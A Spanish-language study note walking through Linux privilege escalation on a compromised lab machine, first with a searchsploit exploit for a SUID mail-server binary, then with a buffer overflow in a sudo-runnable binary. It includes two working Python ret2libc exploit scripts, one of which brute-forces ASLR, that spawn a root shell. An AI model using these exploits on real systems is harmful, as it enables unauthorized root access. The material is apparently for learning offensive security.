


Tenemos un ejemplo en el cual hemos comprometido una maquina y al momento de enumerar los archivos con privilegios suid vemos varios binarios pero el que nos interesa este


![[Pasted image 20240229201548.png]]

Al parecer este binario es de un  servidor de correo electrónico de código abierto al investigar la version del binario con ayuda de searchsploit se encontro un exploit el cual nos ayuda a escalar privilegios 

![[Pasted image 20240229203704.png]]

Este es el exploit que nos ayudara a esclar privilegios

![[Pasted image 20240229203813.png]]

Ahora solo falta mover el exploit de la maquina atacante a la maquina victima cuando este ya este en la maquina victima lo ejecutamos y en si ya tendiramos una bash como root y asi de facil se habrian escalado privilegios 

![[Pasted image 20240229204918.png]]


Otro caso es donde tenemos una maquina donde al enumerarla y hacer un sudo -l podemos ver que hay un binario que se ejecuta como root y sin necesidad de contraseña al  ejecutarlo nos pide que le pasemos como argumento un string

![[Pasted image 20240302184625.png]]

Posiblemente esto sea propenso a buffer overflow ya que al momento de ingrearle varios caracteres este nos responde con una violacion de segmento


![[Pasted image 20240229232606.png]]

Al analizarlo mas a fondo con gdb vemos que al ingresarle varios caracteres el registro EIP se sobrescribe por lo que probablmente nos puedamos arovechar de este registro

![[Pasted image 20240229233212.png]]

Primero lo que tenemos que hacer es encontrar el offset con ayuda del siguiente comando podemos crear un patron de una cantidad especifcada para luego pasarlo como argumento al binario 

![[Pasted image 20240302105012.png]]

Ya establecido el patron ahora lo que tenemos que hacer es correr el programa y nos aparecera que el EIP ha sido sobrescrito con el patron antes configurado

![[Pasted image 20240302105314.png]]

Ahora ya podremos saber cual es el offset para eso tendremos que colocar el siguiente comando donde nos apareceran los offsets de los registros entre ellos los del EIP 


![[Pasted image 20240302113158.png]]

Ya sabiendo cual es el offset para llegar a sobrescribir el EIP podemos verifarlo de la siguiente manera primero corremos el programa pasandole un comando el cual manda 112 as y 4 bes las cuales corresponden a 4 bytes y si estas 4 bes se respresentan en hexadecimal 4 veces signifac que ya tendremos controlado el EIP y podremos saltar a cualquier direccion que le pongamos

![[Pasted image 20240302114136.png]]

Y listo como podemos ver el registro EIP ahora tiene 4 bes asi que ahora lo podemos controlar a nuestro favor


![[Pasted image 20240302114324.png]]

Al analizar la seguridad de binaro podemos ver que tiene el NX activado por lo que la manera mas rentable de ejecutar comandos como root es con un ret2libc 

![[Pasted image 20240302123002.png]]


Tambien al ver si el ASLR esta activado vemos que las direcciones estan siendo aleatorias por lo tanto el ASLR si esta activado

![[Pasted image 20240302125156.png]]

Al ver que que la maquina corren en 32 bits es probable de que haya una colision de direcciones de memoria por que estas pueden repetirse y con esto podriamos bypassear el ASLR a continuacion se muestra que una direccion de memoria se repite varias veces 

![[Pasted image 20240302130500.png]]

A modo de ejemplo si por alguna razon el ASLR esta desactivado lo que podriamos hacer es que podriamos abrir el programa  desde gdb para luego ver las funcines que esta disponibles de la siguiente manera

![[Pasted image 20240302143436.png]]

Viendo las funciones podemos ver que hay una funcion llamada main entonces lo que podemos hacer es poner un break point en la funcion main para luego poder sacar las direcciones de todo lo necesario para el ret2libc 

![[Pasted image 20240302143709.png]]

Ya con el punto de interrupcion puesto lo que podemos hacer es correr el programa y buscar lo necesario para hacer el ret2libc en este caso sera la direccion de memoria de la instruccion system luego la direccion de memoria de la instuccion exit y finalmente  la direccion de memoria de /bin/sh y lo haremos de la siguiente manera

![[Pasted image 20240302144023.png]]


Ya con las direcciones obtenidas podemos hacer un script en python para asi tratar de sacar una sh y escalar privilegios aprovechandonos de los sudoers el script es el siguiente 

```python
from struct import pack
import subprocess


padding=b'A'*112


system_adress=pack("<L",0xb7e40db0)
exit_adress=pack("<L",0xb7e349e0)
sh_adress=pack("<L", 0xb7f61b2b)

payload=padding+system_adress+exit_adress+sh_adress

subprocess.run(["sudo","./custom",payload])

```

  
El script comienza definiendo un relleno (padding) mediante la creación de una cadena de caracteres compuesta por 112 veces el carácter 'A'. Este relleno se emplea para ocupar un buffer en el programa vulnerable. Luego, se procede a calcular las direcciones de las funciones system, exit y la cadena "/bin/sh". Estas direcciones se empaquetan en formato little-endian utilizando la función pack del módulo struct. A continuación, se construye el payload concatenando el relleno con las direcciones de las funciones. Este payload, que contiene la información necesaria para ejecutar ciertas acciones, será el input que se enviará al programa vulnerable. Finalmente, se emplea subprocess.run para ejecutar el programa custom con el payload como argumento, otorgándole privilegios de superusuario mediante el uso de sudo.


Ahora solo ejecutamos el exploit y esperamos que nos de una sh coomo usuario root


![[Pasted image 20240302183923.png]]

Y listo asi nos podemos aprovechar de un binario sin ASLR el cual es vulnerable a buffer overflow y se puede ejecutar como root sin necesidad de contraseña ahora veremos el otro caso que es cuando el ASLR esta activado 


Primero tendremos que encontrar los offsets de system, exit y /bin/sh para esto primero tenemos que saber la ubicacion del libc que esta utilizando el binario asi que ejecutamos el siguiente comando y ahora saberemos la ruta donde se encuentra


![[Pasted image 20240302145431.png]]

Sabiendo la ruta del libc ahora si podriamos localizar los offsets de system y exit ejecutando el siguiente comando

![[Pasted image 20240302145725.png]]

Ahora solo falta encontrar el offset de /bin/sh ese lo podemos encontrar ejecutando el siguiente comando

![[Pasted image 20240302151345.png]]

Ya con esto podriamos hacer un exploit en python como el que se muestra a continuacion 

```python
import subprocess
import sys
from struct import pack

libc=0xb7d46000

padding=b'A'*112

system_offset=0x0003adb0
exit_offset=0x0002e9e0
sh_offset=0x0015bb2b


system_adress=pack("<L",system_offset+libc)
exit_adress=pack("<L",exit_offset+libc)
sh_adress=pack("<L",sh_offset+libc)

payload=padding+system_adress+exit_adress+sh_adress


while True:

	result = subprocess.run(["sudo", "./custom", payload])
	if result.returncode == 0:

		print("\n\n[+] Se ha salido correctamente del programa\n")
		sys.exit(0)

```

Este script define la dirección base de la biblioteca de C estándar (libc) y crea un relleno de 112 caracteres 'A' para llenar un buffer en el programa vulnerable. A continuación, se definen offsets para las funciones `system`, `exit` y la cadena "/bin/sh" dentro de libc, y se calculan las direcciones absolutas correspondientes. Estas direcciones se concatenan para formar un payload que se enviará al programa vulnerable. Se establece un bucle infinito que ejecuta el programa vulnerable con el payload como argumento 

Y listo al ejecutarlo podemos ver que nos arroja una sh y si verificamos que usuario somos nos dice que ahora somos root ya que nos hemos aprovechado de que el binario se podia ejecutar como root siendo un usuario normal y sin necesidad de colocar contraseña  



![[Pasted image 20240302171420.png]]

Asi es como nos podemos aprovechar de binarios especificos del sistema













